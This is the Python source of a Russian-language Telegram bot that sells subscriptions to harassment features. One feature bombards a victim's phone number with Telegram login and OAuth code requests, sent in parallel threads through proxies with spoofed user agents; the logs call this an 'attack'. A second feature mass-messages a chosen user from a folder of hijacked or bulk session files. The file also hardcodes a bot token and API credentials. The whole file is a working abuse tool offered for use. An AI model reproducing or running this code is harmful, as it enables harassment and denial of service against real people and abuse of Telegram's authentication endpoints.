import requests
import re
import time
import random
import threading
import os
import asyncio
from fake_useragent import UserAgent
import telebot
import logging
import sqlite3
from datetime import datetime, timedelta
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telethon import TelegramClient
from telethon.errors import FloodWaitError, SessionPasswordNeededError, RPCError
import aiohttp

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)

bot = telebot.TeleBot("7498558013:AAHY5NyjAijEjn_xhVEifVie6jbn8rm7qFI")
ADMIN_CHAT_ID = 123456789

sessions_dir = "sessions"
api_id = 21636249
api_hash = "05b4ba73bb55976b06a76ec18ed609e4"

user_data = {}

NETWORK_TIMEOUT = 10
RETRY_ATTEMPTS = 3
RETRY_DELAY = 2

def init_db():
    try:
        conn = sqlite3.connect('subscriptions.db')
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS subscriptions
                     (chat_id INTEGER PRIMARY KEY, subscription_end TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS profiles
                     (chat_id INTEGER PRIMARY KEY, flood_count INTEGER DEFAULT 0)''')
        c.execute('''CREATE TABLE IF NOT EXISTS settings
                     (key TEXT PRIMARY KEY, value INTEGER)''')
        c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('subscription_price', 1)")
        conn.commit()
    except Exception as e:
        logging.error(f"Ошибка при инициализации базы данных: {e}")
    finally:
        conn.close()

def get_subscription_price():
    try:
        conn = sqlite3.connect('subscriptions.db')
        c = conn.cursor()
        c.execute("SELECT value FROM settings WHERE key = 'subscription_price'")
        result = c.fetchone()
        return result[0] if result else 1
    except Exception as e:
        logging.error(f"Ошибка при получении цены подписки: {e}")
        return 1
    finally:
        conn.close()

def set_subscription_price(new_price):
    try:
        conn = sqlite3.connect('subscriptions.db')
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES ('subscription_price', ?)", (new_price,))
        conn.commit()
    except Exception as e:
        logging.error(f"Ошибка при установке цены подписки: {e}")
    finally:
        conn.close()

def check_subscription(chat_id):
    try:
        conn = sqlite3.connect('subscriptions.db')
        c = conn.cursor()
        c.execute("SELECT subscription_end FROM subscriptions WHERE chat_id = ?", (chat_id,))
        result = c.fetchone()
        if result:
            subscription_end = datetime.strptime(result[0], '%Y-%m-%d %H:%M:%S')
            return subscription_end > datetime.now()
        return False
    except Exception as e:
        logging.error(f"Ошибка при проверке подписки: {e}")
        return False
    finally:
        conn.close()

def get_subscription_end(chat_id):
    try:
        conn = sqlite3.connect('subscriptions.db')
        c = conn.cursor()
        c.execute("SELECT subscription_end FROM subscriptions WHERE chat_id = ?", (chat_id,))
        result = c.fetchone()
        if result:
            return datetime.strptime(result[0], '%Y-%m-%d %H:%M:%S')
        return None
    except Exception as e:
        logging.error(f"Ошибка при получении даты окончания подписки: {e}")
        return None
    finally:
        conn.close()

def update_subscription(chat_id, duration_days=30):
    try:
        subscription_end = (datetime.now() + timedelta(days=duration_days)).strftime('%Y-%m-%d %H:%M:%S')
        conn = sqlite3.connect('subscriptions.db')
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO subscriptions (chat_id, subscription_end) VALUES (?, ?)",
                  (chat_id, subscription_end))
        conn.commit()
    except Exception as e:
        logging.error(f"Ошибка при обновлении подписки: {e}")
    finally:
        conn.close()

def increment_flood_count(chat_id):
    try:
        conn = sqlite3.connect('subscriptions.db')
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO profiles (chat_id, flood_count) VALUES (?, 0)", (chat_id,))
        c.execute("UPDATE profiles SET flood_count = flood_count + 1 WHERE chat_id = ?", (chat_id,))
        conn.commit()
    except Exception as e:
        logging.error(f"Ошибка при увеличении счётчика флудов: {e}")
    finally:
        conn.close()

def get_profile(chat_id):
    try:
        conn = sqlite3.connect('subscriptions.db')
        c = conn.cursor()
        c.execute("SELECT flood_count FROM profiles WHERE chat_id = ?", (chat_id,))
        result = c.fetchone()
        return result[0] if result else 0
    except Exception as e:
        logging.error(f"Ошибка при получении профиля: {e}")
        return 0
    finally:
        conn.close()

def clean_phone_number(phone_number):
    try:
        cleaned = re.sub(r'\D', '', phone_number)
        if not cleaned.startswith('7') and not cleaned.startswith('1'):
            cleaned = '7' + cleaned
        return f'+{cleaned}'
    except Exception as e:
        logging.error(f"Ошибка при очистке номера телефона: {e}")
        return None

def check_proxy(proxy):
    try:
        response = requests.get(
            "https://www.google.com",
            proxies={'http': f'http://{proxy}', 'https': f'http://{proxy}'},
            timeout=NETWORK_TIMEOUT
        )
        return response.status_code == 200
    except requests.RequestException as e:
        logging.warning(f"❌ Прокси {proxy} не работает: {e}")
        return False

def get_working_proxy(proxies):
    for _ in range(RETRY_ATTEMPTS):
        proxy = random.choice(proxies)
        if check_proxy(proxy):
            return proxy
        logging.warning(f"❌ Прокси {proxy} не работает, пробуем другой...")
        time.sleep(RETRY_DELAY)
    logging.error("Не удалось найти рабочий прокси.")
    return None

def send_request(service, phone_number, ua, use_proxy, proxies):
    proxy_dict = None
    if use_proxy:
        proxy = get_working_proxy(proxies)
        if proxy:
            proxy_dict = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
            logging.info(f"🌐 Используется рабочий прокси: {proxy}")
        else:
            logging.warning("Прокси не найден, отправка без прокси.")
    try:
        response = requests.request(
            method=service.get('method', 'POST'),
            url=service['url'],
            headers=service['headers'],
            data=service.get('data', {}),
            proxies=proxy_dict,
            timeout=NETWORK_TIMEOUT
        )
        if response.status_code == 200:
            logging.info(f"✅ Успешно отправлено → {service['url']}")
        else:
            logging.error(f"❌ Ошибка {response.status_code} → {service['url']}")
    except requests.RequestException as e:
        logging.error(f"⚠ Ошибка сети → {e}")

def send_flood_requests(phone_number, use_proxy, chat_id, attempts=2, delay=3):
    phone_number = clean_phone_number(phone_number)
    if not phone_number:
        bot.send_message(chat_id, "Ошибка: некорректный номер телефона.")
        show_main_menu(chat_id)
        return
    ua = UserAgent()
    proxies = [
        '178.48.68.61:18080',
        '39.185.44.125:5911',
        '72.10.160.90:12563'
    ]
    services = [
        {
            'method': 'POST',
            'url': "https://my.telegram.org/auth/send_password",
            'headers': {
                'User-Agent': ua.random,
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Referer': 'https://my.telegram.org/auth',
                'X-Requested-With': 'XMLHttpRequest'
            },
            'data': {'phone': phone_number}
        },
        {
            'method': 'GET',
            'url': "https://telegram.org/support?setln=ru",
            'headers': {
                'User-Agent': ua.random
            }
        },
        {
            'method': 'POST',
            'url': "https://my.telegram.org/auth/",
            'headers': {
                'User-Agent': ua.random,
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
            },
            'data': {'phone': phone_number}
        },
        {
            'method': 'GET',
            'url': "https://my.telegram.org/auth/reset",
            'headers': {
                'User-Agent': ua.random
            }
        },
        {
            'method': 'POST',
            'url': "https://my.telegram.org/auth/recovery",
            'headers': {
                'User-Agent': ua.random,
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
            },
            'data': {'phone': phone_number}
        },
        {
            'method': 'POST',
            'url': "https://translations.telegram.org/auth/request",
            'headers': {
                'User-Agent': ua.random,
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
            },
            'data': {'phone': phone_number}
        }
    ]
    bot_ids = [
        '5444323279', '5709824482', '1803424014', '1852523856',
        '366357143', '5121228034', '5096885791', '7131017560',
        '5463728243', '6708902161', '218313516', '1199558236',
        '1093384146', '466141824', '1733143901', '319709511',
        '210944655'
    ]
    origins = [
        'https://fragment.com', 'https://lzt.market', 'https://ru.telegram-store.com',
        'https://cabinet.presscode.app', 'https://www.botobot.ru',
        'https://definova.club', 'https://accsmoll.com', 'https://lolz.live',
        'https://www.spot.uz', 'https://ourauthpoint777.com', 'https://startpack.ru',
        'https://bot-t.com', 'https://off-bot.ru', 'https://mipped.com',
        'https://tbiz.pro', 'https://telegrambot.biz', 'https://combot.org'
    ]
    for bot_id, origin in zip(bot_ids, origins):
        services.append({
            'method': 'POST',
            'url': "https://oauth.telegram.org/auth/request",
            'headers': {
                'User-Agent': ua.random,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': 'https://oauth.telegram.org/auth'
            },
            'data': {
                'phone': phone_number,
                'bot_id': bot_id,
                'origin': origin,
                'request_access': 'write',
                'return_to': 'https://fragment.com/'
            }
        })
    logging.info("\n" + "=" * 50)
    logging.info(f"🚀 Начало атаки на {phone_number}")
    logging.info("=" * 50)
    for attempt in range(attempts):
        logging.info(f"\n🔁 Попытка {attempt + 1} из {attempts}")
        threads = []
        for service in services:
            thread = threading.Thread(target=send_request, args=(service, phone_number, ua, use_proxy, proxies))
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join()
        logging.info("=" * 50)
        if attempt < attempts - 1:
            logging.info(f"⏳ Ожидание {delay} секунд перед следующей попыткой...\n")
            time.sleep(delay)
    logging.info("\n✅ Атака завершена!")
    logging.info("=" * 50)
    bot.send_message(chat_id, "Флуд окончен")
    show_main_menu(chat_id)

async def is_user_premium(client, recipient):
    try:
        user = await client.get_users(recipient)
        if not user:
            logging.warning(f"Пользователь {recipient} не найден")
            return False
        is_premium = getattr(user[0], 'premium', False)
        logging.info(f"Проверка Premium для {recipient}: {'Premium' if is_premium else 'Не Premium'}")
        return is_premium
    except Exception as e:
        logging.error(f"Ошибка при проверке Premium для {recipient}: {e}")
        return False

async def send_message_with_client(session_path, recipient, message):
    for attempt in range(RETRY_ATTEMPTS):
        try:
            async with TelegramClient(session_path, api_id, api_hash, timeout=NETWORK_TIMEOUT) as client:
                await client.start()
                await client.get_me()
                await client.send_message(recipient, message)
                return True
        except (FloodWaitError, SessionPasswordNeededError, RPCError, asyncio.TimeoutError, aiohttp.ClientError) as e:
            if isinstance(e, FloodWaitError):
                logging.warning(f"Сессия {session_path} ограничена (Flood Wait). Ожидание: {e.seconds} секунд")
                return False
            elif isinstance(e, SessionPasswordNeededError):
                logging.error(f"Сессия {session_path} требует пароль для двухфакторной аутентификации.")
                return False
            elif isinstance(e, RPCError) and "PRIVACY_PREMIUM_REQUIRED" in str(e):
                logging.error(f"Сессия {session_path}: PRIVACY_PREMIUM_REQUIRED для {recipient}")
                return False
            elif attempt < RETRY_ATTEMPTS - 1:
                logging.warning(f"Ошибка при отправке сообщения с сессией {session_path}: {e}. Повторная попытка через {RETRY_DELAY} секунд...")
                await asyncio.sleep(RETRY_DELAY)
            else:
                logging.error(f"Не удалось отправить сообщение с сессией {session_path} после {RETRY_ATTEMPTS} попыток: {e}")
                return False
        except Exception as e:
            logging.error(f"Неизвестная ошибка с сессией {session_path}: {e}")
            return False
    return False

def send_message_flood(recipient, message, chat_id):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        session_files = [f for f in os.listdir(sessions_dir) if f.endswith('.session')]
        if not session_files:
            bot.send_message(chat_id, f"Не найдено ни одного файла .session в директории {sessions_dir}")
            show_main_menu(chat_id)
            return
        if not recipient.startswith('@'):
            bot.send_message(chat_id, "Ошибка: имя пользователя должно начинаться с @")
            show_main_menu(chat_id)
            return
        async def check_premium_status():
            for session_file in session_files[:3]:
                session_path = os.path.join(sessions_dir, session_file)
                async with TelegramClient(session_path, api_id, api_hash, timeout=NETWORK_TIMEOUT) as client:
                    try:
                        return await is_user_premium(client, recipient)
                    except Exception as e:
                        logging.warning(f"Ошибка проверки Premium с сессией {session_file}: {e}")
                        continue
            return False
        is_premium = loop.run_until_complete(check_premium_status())
        if is_premium:
            bot.send_message(chat_id, "У пользователя Telegram Premium, сообщения могут быть закрыты.")
            show_main_menu(chat_id)
            return
        tasks = []
        for session_file in session_files:
            session_name = os.path.splitext(session_file)[0]
            session_path = os.path.join(sessions_dir, session_name)
            logging.info(f"Проверка сессии: {session_name}")
            tasks.append(send_message_with_client(session_path, recipient, message))
        results = loop.run_until_complete(asyncio.gather(*tasks, return_exceptions=True))
        for session_name, result in zip(session_files, results):
            session_name = os.path.splitext(session_name)[0]
            if result is True:
                logging.info(f"Сообщение отправлено от {session_name} пользователю {recipient}")
            elif result is False:
                logging.warning(f"Не удалось отправить сообщение от {session_name}")
            else:
                logging.error(f"Неожиданный результат для сессии {session_name}: {result}")
        bot.send_message(chat_id, "Флуд сообщениями завершён!")
    except Exception as e:
        logging.error(f"Ошибка в send_message_flood: {e}")
        bot.send_message(chat_id, "Произошла ошибка при флуде сообщениями. Попробуйте снова.")
    finally:
        pending = asyncio.all_tasks(loop=loop)
        if pending:
            loop.run_until_complete(asyncio.gather(*pending, return_exceptions=True))
        loop.close()
    show_main_menu(chat_id)

def show_main_menu(chat_id):
    try:
        markup = ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add(KeyboardButton("Флуд кодами"), KeyboardButton("Флуд сообщениями"))
        markup.add(KeyboardButton("Моя подписка"), KeyboardButton("Мой профиль"))
        bot.send_message(chat_id, "Выберите действие:", reply_markup=markup)
    except Exception as e:
        logging.error(f"Ошибка при отображении меню: {e}")
        bot.send_message(chat_id, "Произошла ошибка при отображении меню. Попробуйте снова.")

def send_subscription_invoice(chat_id):
    try:
        price = get_subscription_price()
        bot.send_invoice(
            chat_id,
            title="Подписка на флудинг",
            description=f"Оформите подписку за {price} Telegram Star в месяц для доступа к флудингу.",
            invoice_payload="subscription_payment",
            provider_token="",
            currency="XTR",
            prices=[telebot.types.LabeledPrice(label="Подписка на 1 месяц", amount=price)],
            start_parameter="subscription_payment"
        )
        logging.info(f"Инвойс на подписку отправлен пользователю {chat_id}")
    except Exception as e:
        logging.error(f"Ошибка при отправке инвойса на подписку: {e}")
        bot.send_message(chat_id, "Произошла ошибка при отправке запроса на оплату. Попробуйте снова.")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    try:
        bot.reply_to(message, "Привет! Я бот для флудинга. Для начала работы оформи подписку (1 Telegram Star в месяц).")
        if check_subscription(chat_id):
            show_main_menu(chat_id)
        else:
            send_subscription_invoice(chat_id)
    except Exception as e:
        logging.error(f"Ошибка в send_welcome: {e}")
        bot.reply_to(message, "Произошла ошибка. Попробуйте снова.")

@bot.message_handler(commands=['menu'])
def show_menu(message):
    chat_id = message.chat.id
    try:
        if check_subscription(chat_id):
            show_main_menu(chat_id)
        else:
            bot.reply_to(message, "Для доступа к меню требуется подписка. Стоимость: " + str(get_subscription_price()) + " Telegram Star в месяц.")
            send_subscription_invoice(chat_id)
    except Exception as e:
        logging.error(f"Ошибка в show_menu: {e}")
        bot.reply_to(message, "Произошла ошибка. Попробуйте снова.")

@bot.message_handler(commands=['subscription'])
def check_subscription_status(message):
    chat_id = message.chat.id
    try:
        subscription_end = get_subscription_end(chat_id)
        if subscription_end:
            remaining_time = subscription_end - datetime.now()
            days_left = remaining_time.days
            hours_left = remaining_time.seconds // 3600
            minutes_left = (remaining_time.seconds % 3600) // 60
            bot.reply_to(message, f"Ваша подписка активна до {subscription_end.strftime('%Y-%m-%d %H:%M:%S')}.\n"
                                 f"Осталось: {days_left} дней, {hours_left} часов, {minutes_left} минут.")
        else:
            bot.reply_to(message, "У вас нет активной подписки. Оформите подписку за " + str(get_subscription_price()) + " Telegram Star в месяц.")
            send_subscription_invoice(chat_id)
        show_main_menu(chat_id)
    except Exception as e:
        logging.error(f"Ошибка в check_subscription_status: {e}")
        bot.reply_to(message, "Произошла ошибка. Попробуйте снова.")

@bot.message_handler(commands=['profile'])
def show_profile(message):
    chat_id = message.chat.id
    try:
        flood_count = get_profile(chat_id)
        bot.reply_to(message, f"Ваш профиль:\n"
                             f"ID: {chat_id}\n"
                             f"Количество флудов: {flood_count}")
        show_main_menu(chat_id)
    except Exception as e:
        logging.error(f"Ошибка в show_profile: {e}")
        bot.reply_to(message, "Произошла ошибка. Попробуйте снова.")

@bot.message_handler(commands=['setprice'])
def set_price(message):
    chat_id = message.chat.id
    if chat_id != ADMIN_CHAT_ID:
        bot.reply_to(message, "У вас нет прав для этой команды.")
        return
    try:
        bot.reply_to(message, "Введите новое количество Telegram Stars для подписки:")
        bot.register_next_step_handler(message, set_price_value)
    except Exception as e:
        logging.error(f"Ошибка в set_price: {e}")
        bot.reply_to(message, "Произошла ошибка. Попробуйте снова.")

def set_price_value(message):
    chat_id = message.chat.id
    if chat_id != ADMIN_CHAT_ID:
        bot.reply_to(message, "У вас нет прав для этой команды.")
        return
    try:
        new_price = int(message.text)
        if new_price < 1:
            bot.reply_to(message, "Цена должна быть больше 0.")
            bot.register_next_step_handler(message, set_price_value)
            return
        set_subscription_price(new_price)
        bot.reply_to(message, f"Цена подписки изменена на {new_price} Telegram Stars.")
    except ValueError:
        bot.reply_to(message, "Пожалуйста, введите число.")
        bot.register_next_step_handler(message, set_price_value)
    except Exception as e:
        logging.error(f"Ошибка в set_price_value: {e}")
        bot.reply_to(message, "Произошла ошибка. Попробуйте снова.")

@bot.message_handler(commands=['give_subscription'])
def give_subscription(message):
    chat_id = message.chat.id
    if chat_id != ADMIN_CHAT_ID:
        bot.reply_to(message, "У вас нет прав для этой команды.")
        return
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.reply_to(message, "Используйте: /give_subscription <chat_id> <дни>\nПример: /give_subscription 7775482665 30")
            return
        target_chat_id = int(args[1].strip())
        duration_days = int(args[2].strip())
        if duration_days < 1:
            bot.reply_to(message, "Количество дней должно быть больше 0.")
            return
        update_subscription(target_chat_id, duration_days)
        bot.reply_to(message, f"Подписка на {duration_days} дней успешно выдана пользователю с chat_id {target_chat_id}.")
        bot.send_message(target_chat_id, f"Вам выдана подписка на {duration_days} дней!")
    except ValueError:
        bot.reply_to(message, "Пожалуйста, введите корректные данные: /give_subscription <chat_id> <дни>")
    except Exception as e:
        logging.error(f"Ошибка в give_subscription: {e}")
        bot.reply_to(message, f"Произошла ошибка: {str(e)}")

@bot.message_handler(commands=['revoke_subscription'])
def revoke_subscription(message):
    chat_id = message.chat.id
    if chat_id != ADMIN_CHAT_ID:
        bot.reply_to(message, "У вас нет прав для этой команды.")
        return
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "Используйте: /revoke_subscription <chat_id>\nПример: /revoke_subscription 7775482665")
            return
        target_chat_id = int(args[1].strip())
        conn = sqlite3.connect('subscriptions.db')
        c = conn.cursor()
        c.execute("DELETE FROM subscriptions WHERE chat_id = ?", (target_chat_id,))
        conn.commit()
        conn.close()
        bot.reply_to(message, f"Подписка пользователя с chat_id {target_chat_id} успешно отозвана.")
        bot.send_message(target_chat_id, "Ваша подписка была отозвана администратором.")
    except ValueError:
        bot.reply_to(message, "Пожалуйста, введите корректный chat_id: /revoke_subscription <chat_id>")
    except Exception as e:
        logging.error(f"Ошибка в revoke_subscription: {e}")
        bot.reply_to(message, f"Произошла ошибка: {str(e)}")

@bot.message_handler(func=lambda message: message.text == "Флуд кодами")
def start_flood_process(message):
    chat_id = message.chat.id
    try:
        if not check_subscription(chat_id):
            bot.reply_to(message, "Ваша подписка истекла. Оформите подписку за " + str(get_subscription_price()) + " Telegram Star в месяц.")
            send_subscription_invoice(chat_id)
            return
        bot.reply_to(message, "Отправь мне номер телефона для флудинга (в любом формате).")
        bot.register_next_step_handler(message, get_phone_number)
    except Exception as e:
        logging.error(f"Ошибка в start_flood_process: {e}")
        bot.reply_to(message, "Произошла ошибка. Попробуйте снова.")

@bot.message_handler(func=lambda message: message.text == "Флуд сообщениями")
def start_message_flood_process(message):
    chat_id = message.chat.id
    try:
        if not check_subscription(chat_id):
            bot.reply_to(message, "Ваша подписка истекла. Оформите подписку за " + str(get_subscription_price()) + " Telegram Star в месяц.")
            send_subscription_invoice(chat_id)
            return
        bot.reply_to(message, "Введите имя пользователя в формате @username (например, @friend):")
        bot.register_next_step_handler(message, get_recipient)
    except Exception as e:
        logging.error(f"Ошибка в start_message_flood_process: {e}")
        bot.reply_to(message, "Произошла ошибка. Попробуйте снова.")

def get_recipient(message):
    chat_id = message.chat.id
    try:
        if not check_subscription(chat_id):
            bot.reply_to(message, "Ваша подписка истекла. Оформите подписку за " + str(get_subscription_price()) + " Telegram Star в месяц.")
            send_subscription_invoice(chat_id)
            return
        if message.text in ["Флуд кодами", "Флуд сообщениями", "Моя подписка", "Мой профиль"]:
            bot.reply_to(message, "Пожалуйста, введите имя пользователя в формате @username.")
            bot.register_next_step_handler(message, get_recipient)
            return
        recipient = message.text
        user_data[chat_id] = {'recipient': recipient}
        bot.reply_to(message, "Введите сообщение для отправки:")
        bot.register_next_step_handler(message, get_message)
    except Exception as e:
        logging.error(f"Ошибка в get_recipient: {e}")
        bot.reply_to(message, "Произошла ошибка. Попробуйте снова.")

def get_message(message):
    chat_id = message.chat.id
    try:
        if not check_subscription(chat_id):
            bot.reply_to(message, "Ваша подписка истекла. Оформите подписку за " + str(get_subscription_price()) + " Telegram Star в месяц.")
            send_subscription_invoice(chat_id)
            return
        if message.text in ["Флуд кодами", "Флуд сообщениями", "Моя подписка", "Мой профиль"]:
            bot.reply_to(message, "Пожалуйста, введите сообщение для отправки.")
            bot.register_next_step_handler(message, get_message)
            return
        user_message = message.text
        user_data[chat_id]['message'] = user_message
        recipient = user_data[chat_id]['recipient']
        bot.reply_to(message, f"Начинаю флуд сообщениями для {recipient}...")
        threading.Thread(target=send_message_flood, args=(recipient, user_message, chat_id)).start()
    except Exception as e:
        logging.error(f"Ошибка в get_message: {e}")
        bot.reply_to(message, "Произошла ошибка. Попробуйте снова.")

def get_phone_number(message):
    chat_id = message.chat.id
    try:
        if not check_subscription(chat_id):
            bot.reply_to(message, "Ваша подписка истекла. Оформите подписку за " + str(get_subscription_price()) + " Telegram Star в месяц.")
            send_subscription_invoice(chat_id)
            return
        if message.text in ["Флуд кодами", "Флуд сообщениями", "Моя подписка", "Мой профиль"]:
            bot.reply_to(message, "Пожалуйста, введи номер телефона.")
            bot.register_next_step_handler(message, get_phone_number)
            return
        phone_number = message.text
        user_data[chat_id] = {'phone_number': phone_number}
        
        markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        markup.add(KeyboardButton("Да"), KeyboardButton("Нет"))
        markup.add(KeyboardButton("Отмена"))
        bot.reply_to(message, "Использовать прокси?", reply_markup=markup)
        bot.register_next_step_handler(message, get_proxy_choice)
    except Exception as e:
        logging.error(f"Ошибка в get_phone_number: {e}")
        bot.reply_to(message, "Произошла ошибка. Попробуйте снова.")

def get_proxy_choice(message):
    chat_id = message.chat.id
    try:
        if not check_subscription(chat_id):
            bot.reply_to(message, "Ваша подписка истекла. Оформите подписку за " + str(get_subscription_price()) + " Telegram Star в месяц.")
            send_subscription_invoice(chat_id)
            return
        
        if message.text == "Отмена":
            bot.reply_to(message, "Действие отменено.", reply_markup=ReplyKeyboardRemove())
            show_main_menu(chat_id)
            return
        
        proxy_choice = message.text.lower()
        if proxy_choice not in ['да', 'нет']:
            markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
            markup.add(KeyboardButton("Да"), KeyboardButton("Нет"))
            markup.add(KeyboardButton("Отмена"))
            bot.reply_to(message, "Пожалуйста, выбери 'Да' или 'Нет' с помощью кнопок.", reply_markup=markup)
            bot.register_next_step_handler(message, get_proxy_choice)
            return
        
        use_proxy = proxy_choice == 'да'
        user_data[chat_id]['use_proxy'] = use_proxy
        phone_number = user_data[chat_id]['phone_number']
        
        markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        markup.add(KeyboardButton("Начать флуд"))
        markup.add(KeyboardButton("Отмена"))
        bot.reply_to(message, f"Номер: {phone_number}, прокси: {'Да' if use_proxy else 'Нет'}. Нажми 'Начать флуд', чтобы начать.", reply_markup=markup)
        bot.register_next_step_handler(message, start_flood)
    except Exception as e:
        logging.error(f"Ошибка в get_proxy_choice: {e}")
        bot.reply_to(message, "Произошла ошибка. Попробуйте снова.")

def start_flood(message):
    chat_id = message.chat.id
    try:
        if not check_subscription(chat_id):
            bot.reply_to(message, "Ваша подписка истекла. Оформите подписку за " + str(get_subscription_price()) + " Telegram Star в месяц.")
            send_subscription_invoice(chat_id)
            return
        
        if message.text == "Отмена":
            bot.reply_to(message, "Действие отменено.", reply_markup=ReplyKeyboardRemove())
            show_main_menu(chat_id)
            return
        
        if message.text != "Начать флуд":
            markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
            markup.add(KeyboardButton("Начать флуд"))
            markup.add(KeyboardButton("Отмена"))
            bot.reply_to(message, "Пожалуйста, нажми 'Начать флуд'.", reply_markup=markup)
            bot.register_next_step_handler(message, start_flood)
            return
        
        phone_number = user_data[chat_id]['phone_number']
        use_proxy = user_data[chat_id]['use_proxy']
        
        increment_flood_count(chat_id)
        
        bot.reply_to(message, f"Начинаю флудинг для {phone_number} с прокси: {'Да' if use_proxy else 'Нет'}", reply_markup=ReplyKeyboardRemove())
        threading.Thread(target=send_flood_requests, args=(phone_number, use_proxy, chat_id)).start()
    except Exception as e:
        logging.error(f"Ошибка в start_flood: {e}")
        bot.reply_to(message, "Произошла ошибка. Попробуйте снова.")

@bot.pre_checkout_query_handler(func=lambda query: True)
def process_pre_checkout_query(pre_checkout_query):
    start_time = time.time()
    try:
        logging.info(f"Получен pre_checkout_query: {pre_checkout_query.id}")
        bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)
        end_time = time.time()
        logging.info(f"Успешно подтверждён pre_checkout_query: {pre_checkout_query.id}, время обработки: {end_time - start_time:.2f} секунд")
    except Exception as e:
        end_time = time.time()
        logging.error(f"Ошибка при обработке pre_checkout_query: {e}, время обработки: {end_time - start_time:.2f} секунд")
        bot.answer_pre_checkout_query(pre_checkout_query.id, ok=False, error_message="Ошибка обработки оплаты")

@bot.message_handler(content_types=['successful_payment'])
def handle_successful_payment(message):
    chat_id = message.chat.id
    try:
        if message.successful_payment.invoice_payload == "subscription_payment":
            update_subscription(chat_id, duration_days=30)
            bot.reply_to(message, "Подписка успешно оформлена! Теперь вы можете использовать флудинг.")
            show_main_menu(chat_id)
            logging.info(f"Подписка оформлена для пользователя {chat_id}")
    except Exception as e:
        logging.error(f"Ошибка в handle_successful_payment: {e}")
        bot.reply_to(message, "Произошла ошибка при обработке оплаты. Попробуйте снова.")

@bot.message_handler(func=lambda message: message.text == "Моя подписка")
def check_subscription_status_button(message):
    chat_id = message.chat.id
    try:
        subscription_end = get_subscription_end(chat_id)
        if subscription_end:
            remaining_time = subscription_end - datetime.now()
            days_left = remaining_time.days
            hours_left = remaining_time.seconds // 3600
            minutes_left = (remaining_time.seconds % 3600) // 60
            bot.reply_to(message, f"Ваша подписка активна до {subscription_end.strftime('%Y-%m-%d %H:%M:%S')}.\n"
                                 f"Осталось: {days_left} дней, {hours_left} часов, {minutes_left} минут.")
        else:
            bot.reply_to(message, "У вас нет активной подписки. Оформите подписку за " + str(get_subscription_price()) + " Telegram Star в месяц.")
            send_subscription_invoice(chat_id)
        show_main_menu(chat_id)
    except Exception as e:
        logging.error(f"Ошибка в check_subscription_status_button: {e}")
        bot.reply_to(message, "Произошла ошибка. Попробуйте снова.")

@bot.message_handler(func=lambda message: message.text == "Мой профиль")
def show_profile_button(message):
    chat_id = message.chat.id
    try:
        flood_count = get_profile(chat_id)
        bot.reply_to(message, f"Ваш профиль:\n"
                             f"ID: {chat_id}\n"
                             f"Количество флудов: {flood_count}")
        show_main_menu(chat_id)
    except Exception as e:
        logging.error(f"Ошибка в show_profile_button: {e}")
        bot.reply_to(message, "Произошла ошибка. Попробуйте снова.")

if __name__ == "__main__":
    init_db()
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Критическая ошибка в работе бота: {e}")
            time.sleep(5)
